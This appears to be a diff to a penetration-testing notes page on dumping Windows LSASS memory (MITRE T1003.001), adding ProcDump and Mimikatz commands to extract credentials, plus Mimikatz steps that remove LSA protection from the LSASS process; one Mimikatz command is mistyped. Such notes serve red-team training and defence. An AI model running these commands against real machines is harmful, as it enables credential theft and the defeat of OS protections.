@@ -28,17 +28,64 @@ The following techniques can be used to exploit this (requires administrator pri
 
 > As defined in the MITRE ATT\&CK framework: **OS Credential Dumping: LSASS Memory (T1003.001)**
 
+### LSA protection
+
+Note that the techniques to dump the LSASS process discussed below may not work due the implementation of the LSA protection, which aims to keep LSASS from being accessed to extract credentials from memory
+
+{% embed url="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#enable-by-using-the-registry" %}
+
+This protection can be enabled with the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key, by setting the `RunAsPPL`&#x20;
+
+**dword** value to **1**.
+
+However, a particular Mimikatz technique can be used to disable this protection (refer to the **Disable LSA protection** section below).&#x20;
+
 ### ProcDump
 
-...
+> ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike.
+
+In our case, we will be using it to dump the LSASS process to disk:
+
+```powershell
+C:\> procdump.exe -accepteula -ma lsass.exe <dump_location>
+```
+
+* `-accepteula`:  to automatically accept the Sysinternals license agreement
+* `-ma:` To write a 'Full' dump file
+  * Includes all memory
+  * Includes all metadata
 
 ### Mimikatz
 
+We can also use Mimikatz to dump the contents of the LSASS process.
 
+#### a. Dump directly from the live LSASS process (requires administrative privileges)
 
+{% code title="Administrator shell" overflow="wrap" %}
+```powershell
+C:\> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekrulsa
+```
+{% endcode %}
 
+#### b. Extract from a previously dumped LSASS process file (does not require administrative privileges)
 
+Given that we have previously dumped the LSASS process to a file named `lsass.dmp` using the `ProcDump` utility, we can use the following commands to extract information from the dumped file:
 
+```powershell
+mimikatz # sekurlsa::minidump lsass.dmp
+```
 
+### Disable LSA protection
 
+{% code title="Administrator shell" %}
+```powershell
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+
+# LSASS dump should now succeed
+mimikatz # sekurlsa::logonpasswords 
+```
+{% endcode %}
 
